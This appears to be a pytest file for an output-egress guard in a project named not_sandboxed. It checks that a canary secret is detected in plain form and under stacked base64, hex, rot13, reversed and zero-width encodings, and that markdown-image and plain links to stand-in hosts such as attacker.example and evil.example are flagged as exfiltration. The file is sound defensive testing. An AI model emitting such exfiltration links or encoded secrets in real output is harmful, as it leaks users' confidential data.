"""
©AngelaMos | 2026
test_egress.py
"""

import base64
import codecs
from collections.abc import Callable

import pytest
from hypothesis import given, settings
from hypothesis import strategies as st

from not_sandboxed import config
from not_sandboxed.layers.egress import EgressLayer
from not_sandboxed.verdict import Finding


SECRET = "VANTAGE-7731-ORION"

ZWSP = chr(0x200B)


def _b64(text: str) -> str:
    return base64.b64encode(text.encode()).decode()


def _hex(text: str) -> str:
    return text.encode().hex()


def _rot13(text: str) -> str:
    return codecs.encode(text, "rot13")


def _reverse(text: str) -> str:
    return text[::-1]


TRANSFORMS: tuple[Callable[[str],
                           str],
                  ...] = (
                      "-".join,
                      " ".join,
                      ".".join,
                      _reverse,
                      _b64,
                      _hex,
                      _rot13,
                      ZWSP.join,
                  )

TRANSFORM_NAMES = (
    "dash",
    "space",
    "dot",
    "reverse",
    "base64",
    "hex",
    "rot13",
    "zero-width",
)


def _rules(findings: list[Finding]) -> set[str]:
    return {finding.rule for finding in findings}


def _layer() -> EgressLayer:
    return EgressLayer(
        canaries = (SECRET,
                    ),
        allowed_hosts = ("vantage.example",
                         ),
    )


def test_plain_secret_is_caught() -> None:
    findings = _layer().inspect_text(f"the secret is {SECRET}")

    assert config.RULE_CANARY_LEAK in _rules(findings)


def test_canary_finding_is_invariant() -> None:
    findings = _layer().inspect_text(SECRET)
    leak = [f for f in findings if f.rule == config.RULE_CANARY_LEAK]

    assert leak[0].invariant is True


def test_clean_output_is_not_a_leak() -> None:
    findings = _layer().inspect_text(
        "Your order 8814 shipped on Tuesday and should arrive "
        "by Friday. Anything else I can help with?"
    )

    assert findings == []


@settings(max_examples = 1500, deadline = None)
@given(
    st.lists(
        st.integers(min_value = 0,
                    max_value = len(TRANSFORMS) - 1),
        min_size = 1,
        max_size = 3,
    )
)
def test_canary_survives_stacked_obfuscation(
    indices: list[int],
) -> None:
    text = SECRET
    for index in indices:
        text = TRANSFORMS[index](text)

    findings = _layer().inspect_text(text)

    stack = " -> ".join(TRANSFORM_NAMES[i] for i in indices)
    assert config.RULE_CANARY_LEAK in _rules(findings), stack


def test_markdown_image_to_unlisted_host_is_blocked() -> None:
    findings = _layer(
    ).inspect_text("![x](https://attacker.example/p?d=hello)")

    assert config.RULE_URL_EGRESS in _rules(findings)
    assert all(
        f.invariant for f in findings if f.rule == config.RULE_URL_EGRESS
    )


def test_plain_link_to_unlisted_host_is_blocked() -> None:
    findings = _layer(
    ).inspect_text("see https://attacker.example/collect?d=abc")

    assert config.RULE_URL_EGRESS in _rules(findings)


def test_allowlisted_host_is_permitted() -> None:
    findings = _layer(
    ).inspect_text("see https://vantage.example/orders/8814")

    assert findings == []


def test_allowlisted_host_still_checked_for_canary() -> None:
    findings = _layer(
    ).inspect_text(f"https://vantage.example/p?d={SECRET}")

    assert config.RULE_CANARY_LEAK in _rules(findings)


def test_a_layer_with_no_canaries_still_guards_urls() -> None:
    layer = EgressLayer(
        canaries = (),
        allowed_hosts = ("vantage.example",
                         ),
    )

    findings = layer.inspect_text("![x](https://evil.example/a)")

    assert config.RULE_URL_EGRESS in _rules(findings)


@pytest.mark.parametrize(
    "text",
    [
        "VANTAGE-7731-ORIO",
        "ANTAGE-7731-ORION",
        "VANTAGE-7732-ORION",
        "VANTAGE is our name and ORION is the product line",
        "The 7731 model was discontinued in 2024.",
    ],
)
def test_near_miss_text_is_not_a_leak(text: str) -> None:
    assert config.RULE_CANARY_LEAK not in _rules(
        _layer().inspect_text(text)
    )


def test_space_separated_canary_is_a_leak() -> None:
    findings = _layer().inspect_text("VANTAGE 7731 ORION")

    assert config.RULE_CANARY_LEAK in _rules(findings)


def test_a_canary_shorter_than_the_floor_is_refused() -> None:
    layer = EgressLayer(
        canaries = ("abc",
                    ),
        allowed_hosts = ()
    )

    assert layer.canaries == ()
    assert layer.inspect_text("abc") == []


def test_variant_search_terminates_on_hostile_input() -> None:
    findings = _layer().inspect_text("A" * 5000)

    assert config.RULE_CANARY_LEAK not in _rules(findings)
